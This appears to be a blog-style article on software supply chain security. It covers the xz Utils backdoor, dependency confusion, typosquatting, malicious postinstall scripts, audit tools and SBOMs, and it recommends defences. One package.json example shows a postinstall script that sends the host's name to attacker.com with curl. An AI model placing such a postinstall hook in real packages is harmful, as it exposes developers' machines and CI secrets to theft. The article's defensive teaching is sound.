  "body_mdx": "## The Problem With \"We Didn't Write That Code\"\n\nA modern Node.js application has 30 to 50 direct dependencies. Each of those has its own dependencies. The total transitive dependency tree for a typical React app is 1,000 to 1,500 packages. A Python data pipeline might have fewer direct dependencies but still pulls in dozens of transitive ones. Most of those packages are maintained by individuals with no security team, no release signing, and no incident response process.\n\nEvery package in that tree runs as your code, with your process permissions, your network access, and access to the same secrets your process can reach. The package doesn't need a vulnerability. It just needs to be compromised.\n\n## The xz Utils Backdoor: What Actually Happened\n\nIn early 2024, a backdoor was found in xz Utils, a compression library present in nearly every Linux distribution. The person who inserted it, using the name Jia Tan, had spent two years contributing legitimate bug fixes and improvements to the project. They built trust, became a co-maintainer, and then inserted the backdoor into the release build process.\n\nThe backdoor was caught by a Microsoft engineer who noticed that SSH connections were taking slightly longer than expected on Fedora systems. He traced the delay to xz. The backdoor had been in the release for roughly a month before discovery. If it had shipped in stable releases of Debian and Ubuntu before discovery, it would have provided remote code execution access on millions of servers.\n\nWhat this demonstrates: the attackers had a long-game strategy. They didn't compromise a dependency manager or steal credentials. They contributed real code for two years to earn the trust required to make a malicious change.\n\n## Dependency Confusion\n\nDependency confusion is a different attack vector that exploits how package managers resolve package names when both a private registry and a public registry are configured.\n\n```mermaid\nsequenceDiagram\n    participant DevTeam as Dev Team\n    participant PackageManager as npm / pip\n    participant PrivateReg as Private Registry<br/>(internal-utils v1.2)\n    participant PublicReg as Public Registry<br/>(npm / PyPI)\n\n    DevTeam->>PackageManager: npm install internal-utils\n    PackageManager->>PublicReg: Is internal-utils on npm?\n    PublicReg-->>PackageManager: Yes! internal-utils v9.9.9\n    Note over PackageManager: Public version has higher version number\n    PackageManager->>PublicReg: Download v9.9.9\n    PublicReg-->>PackageManager: Malicious package\n    PackageManager-->>DevTeam: Installed internal-utils v9.9.9\n    Note over DevTeam: Expected internal package, got attacker's package\n```\n\nAlex Birsan reported in 2021 that he was able to get code execution inside Apple, Microsoft, PayPal, and 33 other companies by publishing packages to npm and PyPI with names that matched their internal private packages, but with higher version numbers. The package managers resolved to the higher public version, installed it, and ran the postinstall script he'd included.\n\n```bash\n# .npmrc misconfiguration that enables confusion attacks\nregistry=https://npm.company.internal/\n# If 'registry' is the fallback, npm will try the private registry first\n# and fall back to npmjs.com for packages not found there\n# An attacker publishes a package with the same name to npmjs.com with version 99.0.0\n\n# Correct — scope internal packages to the private registry explicitly\n@company:registry=https://npm.company.internal/\n# Now @company/internal-utils uses the private registry\n# and unscoped packages use the public registry\n# No confusion possible because private packages are namespaced\n```\n\n## Typosquatting\n\nTyposquatting is simpler and older: publish a package with a name nearly identical to a popular one, then wait for developers to mistype it.\n\n```bash\n# Legitimate packages\nnpm install react\nnpm install lodash\nnpm install express\n\n# Typosquats — real packages uploaded to npm in various campaigns\nnpm install reakt      # 'a' and 't' transposed\nnpm install lod4sh     # '4' instead of 'a'\nnpm install expresss   # extra 's'\n```\n\nSeveral campaigns have targeted `crossenv`, `event-stream`, and similar packages. `event-stream` was a legitimate package with millions of downloads per week. A new maintainer added a dependency that included obfuscated code that stole bitcoin wallet credentials from specific applications.\n\n## Postinstall Scripts: The Execution Vector\n\nThe mechanism that makes dependency attacks so effective is `postinstall` scripts. When `npm install` runs, it executes any `postinstall` script in each package's `package.json`. This is a legitimate mechanism (native addons need to compile on install), and it gives every package in your dependency tree code execution at install time.\n\n```json\n// package.json of a compromised package\n{\n  \"name\": \"legitimate-looking-package\",\n  \"version\": \"1.0.0\",\n  \"scripts\": {\n    \"postinstall\": \"node -e \\\"require('child_process').exec('curl attacker.com/c2?h='+require('os').hostname())\\\"\"\n  }\n}\n```\n\nThis runs during `npm install`, before any developer has run the application code. The exfiltration happens on the developer's machine or in CI, not in production. This is how malicious packages steal AWS credentials from developer machines.\n\n## Audit Tools Are Necessary but Not Sufficient\n\n```bash\n# npm audit checks your dependency tree against a known vulnerability database\nnpm audit\n\n# Fix automatically when safe\nnpm audit fix\n\n# Python equivalent\npip audit\n\n# Or with safety\nsafety check\n```\n\n`npm audit` tells you about known vulnerabilities in packages. It tells you nothing about packages that are compromised but haven't been flagged yet, about packages with malicious postinstall scripts, or about future compromises of currently-clean packages.\n\nSoftware Bill of Materials (SBOM) generation is the next layer. An SBOM is a machine-readable manifest of every package in your build, with exact versions and hashes. When a new supply chain compromise is disclosed, an SBOM lets you answer immediately: do we use this package?\n\n```bash\n# Generate SBOM with Syft\nsyft packages dir:. -o spdx-json=sbom.json\n\n# Scan SBOM against vulnerability database with Grype\ngrype sbom:./sbom.json\n```\n\n## What Actually Reduces Risk\n\n**Pin versions precisely.** Using `^1.2.3` in `package.json` allows automatic minor version updates. A compromised patch release gets installed automatically. Use exact versions in production and tools like Dependabot or Renovate to propose updates as PRs.\n\n```json\n// Unpinned — next npm install may get a different version\n\"dependencies\": {\n  \"express\": \"^4.18.2\"\n}\n\n// Pinned — every install gets the exact same version\n\"dependencies\": {\n  \"express\": \"4.18.2\"\n}\n```\n\n**Lock files are not enough on their own.** `package-lock.json` and `yarn.lock` pin what was installed when you committed the lock file. Running `npm install` without `npm ci` can update the lock file. In CI, always use `npm ci`, not `npm install`.\n\n**Verify checksums.** Package registries publish checksums (integrity hashes) for each package version. `npm ci` verifies these against `package-lock.json`. If the package content on the registry changes without a version bump, the hash mismatch will fail the install.\n\n**Minimize your dependency count.** Every direct dependency is a trust decision. Before adding a package to solve a problem that can be solved with a few lines of native code, consider whether the dependency is worth the exposure.\n\n**Namespace your internal packages.** Use scoped packages (`@company/package-name`) and configure your package manager to always resolve that scope from your private registry. This eliminates dependency confusion entirely for internal packages.\n\n**Audit postinstall scripts in CI.** Some organizations explicitly block packages with postinstall scripts unless they're on a known-good allowlist.\n\nSupply chain attacks are effective because they target the implicit trust that developers place in the package ecosystem. That trust is reasonable in aggregate, but it needs to be paired with controls that detect when that trust is violated."
